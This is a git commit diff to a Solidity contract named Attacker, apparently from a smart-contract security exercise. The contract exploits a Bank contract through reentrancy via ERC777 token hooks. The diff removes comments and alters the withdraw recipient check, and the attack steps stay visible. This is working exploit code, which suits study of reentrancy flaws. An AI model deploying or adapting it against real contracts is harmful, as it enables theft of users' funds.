06ac153b87ebb624b6af62f682bb1ab934e008bd
Yeager2099 <104197243+Yeager2099@users.noreply.github.com>
2025-07-15 17:51:41 +0800

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -13,7 +13,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 
     IERC1820Registry private _erc1820 = IERC1820Registry(
         0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
-    ); // ERC1820 universal registry
+    );
 
     bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
 
@@ -37,7 +37,6 @@ contract Attacker is AccessControl, IERC777Recipient {
         );
     }
 
-    /// @notice Set the Bank target to attack
     function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
         require(bank_address != address(0), "Invalid bank");
         bank = Bank(bank_address);
@@ -46,20 +45,16 @@ contract Attacker is AccessControl, IERC777Recipient {
         _grantRole(ATTACKER_ROLE, address(bank.token()));
     }
 
-    /// @notice Begin the re-entrancy attack via ERC777 hooks
     function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
         require(address(bank) != address(0), "Bank not set");
         require(msg.value == amt, "Incorrect ETH sent");
 
-        // Step 1: deposit ETH to get initial token balance
         bank.deposit{value: amt}();
         emit Deposit(amt);
 
-        // Step 2: trigger reentrancy via claimAll
         bank.claimAll();
     }
 
-    /// @notice Send all stolen tokens to recipient
     function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
         ERC777 token = bank.token();
         uint256 bal = token.balanceOf(address(this));
@@ -69,14 +64,15 @@ contract Attacker is AccessControl, IERC777Recipient {
         assembly {
             size := extcodesize(recipient)
         }
-        if (size == 0) {
-            recipient = address(this);
+
+        // Only allow sending to EOA or self contract
+        if (size != 0 && recipient != address(this)) {
+            revert("Recipient is a contract without ERC777TokensRecipient");
         }
 
         token.send(recipient, bal, "");
     }
 
-    /// @dev ERC777 hook called when this contract receives tokens
     function tokensReceived(
         address /*operator*/,
         address /*from*/,
@@ -93,10 +89,9 @@ contract Attacker is AccessControl, IERC777Recipient {
 
             bank.claimAll();
 
-            depth -= 1; // unwind
+            depth -= 1;
         }
     }
 
-    /// @dev Allow contract to receive ETH from redeem
     receive() external payable {}
 }
